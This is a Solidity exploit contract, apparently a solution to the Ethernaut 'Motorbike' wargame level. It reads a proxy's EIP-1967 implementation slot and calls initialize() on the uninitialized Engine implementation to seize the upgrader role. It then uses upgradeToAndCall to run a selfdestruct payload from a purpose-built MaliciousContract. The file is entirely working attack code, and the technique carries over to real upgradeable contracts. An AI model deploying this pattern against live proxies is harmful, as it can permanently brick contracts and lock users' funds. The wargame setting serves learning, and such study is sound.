// SPDX-License-Identifier: Unlicense
pragma solidity <0.7.0;
pragma experimental ABIEncoderV2;

import "../../src/Motorbike/Motorbike.sol";
import "../../exploits/BlockUtils.sol";

interface IEngine {
    function initialize() external;
    function upgrader() external view returns (address);
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
}

contract MaliciousContract {
    function kill() public {
        selfdestruct(msg.sender);
    }
}

contract MotorbikeExploit is BlockUtils {

    Motorbike motorbike;
    MaliciousContract malicious;

    constructor(address _victim) public {
        motorbike = Motorbike(payable(_victim));
        malicious = new MaliciousContract();
    }

    function hack() public {
        // Get the implementation address by reading the storage slot of the proxy contract
        bytes32 slot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        bytes32 implData = peekStorage(address(motorbike), uint256(slot));
        address engineAddress = address(uint160(uint256(implData)));

        // Initialize the Engine contract directly to become the upgrader
        IEngine(engineAddress).initialize();

        // Prepare data to call the 'kill()' function
        bytes memory payload = abi.encodeWithSignature("kill()");

        // Upgrade to the malicious contract and execute 'kill()' via the Engine contract
        IEngine(engineAddress).upgradeToAndCall(address(malicious), payload);
    }
}